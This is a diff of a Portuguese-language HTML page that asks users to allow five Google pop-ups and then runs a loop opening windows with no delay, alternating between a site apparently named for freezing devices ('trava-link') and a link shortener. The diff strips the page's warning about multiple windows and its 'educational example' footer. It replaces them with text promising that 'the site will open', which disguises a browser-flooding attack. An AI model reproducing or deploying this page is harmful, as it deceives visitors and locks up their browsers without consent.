@@ -118,6 +118,19 @@
             margin-bottom: 8px;
         }
         
+        .links-info {
+            background-color: rgba(155, 89, 182, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border-left: 5px solid #9b59b6;
+        }
+        
+        .links-info h3 {
+            margin-bottom: 10px;
+            color: #9b59b6;
+        }
+        
         @keyframes pulse {
             0% {
                 box-shadow: 0 0 0 0 rgba(52, 152, 219, 0.7);
@@ -146,15 +159,23 @@
             font-size: 0.9rem;
             opacity: 0.7;
         }
+        
+        .loop-info {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: rgba(241, 196, 15, 0.3);
+            border-radius: 8px;
+            border-left: 4px solid #f1c40f;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Site com Múltiplos Pop-ups</h1>
-        <p>Clique no botão abaixo para iniciar o processo. Serão abertos 5 pop-ups do Google. Após aceitar todos, um loop infinito começará a abrir o link especificado.</p>
+        <h1>Site</h1>
+        <p>Clique no botão abaixo para iniciar o processo. Serão abertos 5 pop-ups do Google. Após aceitar todos, o site sera aberto.</p>
         
         <div class="warning">
-            <strong>AVISO:</strong> Este site abrirá múltiplas janelas. Use com cuidado!
+            <strong>AVISO:</strong> este site e criado Por CLEITI6966HUBS
         </div>
         
         <div class="instructions">
@@ -163,7 +184,7 @@
                 <li>Clique no botão "Iniciar Processo"</li>
                 <li>Permita que 5 pop-ups do Google sejam abertos</li>
                 <li>Aceite todos os pop-ups (não feche manualmente)</li>
-                <li>Após aceitar todos, o loop infinito começará automaticamente</li>
+                <li>Após aceitar todos, o Site Será Aberto automaticamente</li>
             </ol>
         </div>
         
@@ -172,17 +193,20 @@
         <button id="finalizarBtn">Iniciar Processo</button>
         
         <div id="status" class="status"></div>
+        
+        <div class="loop-info" id="loopInfo" style="display: none;">
+            <h3>Loop em Execução</h3>
+            <p>Links abertos: <span id="loopCount">0</span></p>
+            <p>Próximo link: <span id="nextLink">https://google.com/</span></p>
+        </div>
     </div>
-    
-    <footer>
-        <p>Este é um exemplo educacional. Use com responsabilidade.</p>
-    </footer>
 
     <script>
         document.getElementById('finalizarBtn').addEventListener('click', function() {
             const button = this;
             const status = document.getElementById('status');
             const popupCounter = document.getElementById('popupCounter');
+            const loopInfo = document.getElementById('loopInfo');
             
             // Desabilita o botão para evitar múltiplos cliques
             button.disabled = true;
@@ -245,18 +269,36 @@
         
         function startInfiniteLoop() {
             const status = document.getElementById('status');
-            status.textContent = 'Loop infinito iniciado! Abrindo links continuamente...';
+            const loopInfo = document.getElementById('loopInfo');
+            const loopCount = document.getElementById('loopCount');
+            const nextLink = document.getElementById('nextLink');
             
-            let loopCount = 0;
+            status.textContent = 'Loop infinito iniciado! Abrindo links alternadamente...';
+            loopInfo.style.display = 'block';
+            
+            let count = 0;
+            let currentLinkIndex = 0;
+            const links = [
+                'https://trava-link.vercel.app/',
+                'https://encurtador-1.vercel.app/'
+            ];
             
             // Função para abrir o link em loop
             function openLink() {
-                window.open('https://trava-link.vercel.app/', `loop${loopCount}`);
-                loopCount++;
+                const link = links[currentLinkIndex];
+                window.open(link, `loop${count}`);
+                count++;
                 
-                // Atualiza o status com o contador
-                if (loopCount % 5 === 0) {
-                    status.textContent = `Loop infinito em execução... ${loopCount} links abertos`;
+                // Alterna para o próximo link
+                currentLinkIndex = (currentLinkIndex + 1) % links.length;
+                
+                // Atualiza a interface
+                loopCount.textContent = count;
+                nextLink.textContent = links[currentLinkIndex];
+                
+                // Atualiza o status periodicamente
+                if (count % 5 === 0) {
+                    status.textContent = `Loop infinito em execução... ${count} links abertos`;
                 }
             }
             
@@ -264,7 +306,7 @@
             openLink();
             
             // Continua abrindo links a cada segundo
-            setInterval(openLink, 00);
+            setInterval(openLink, 0);
         }
     </script>
 </body>
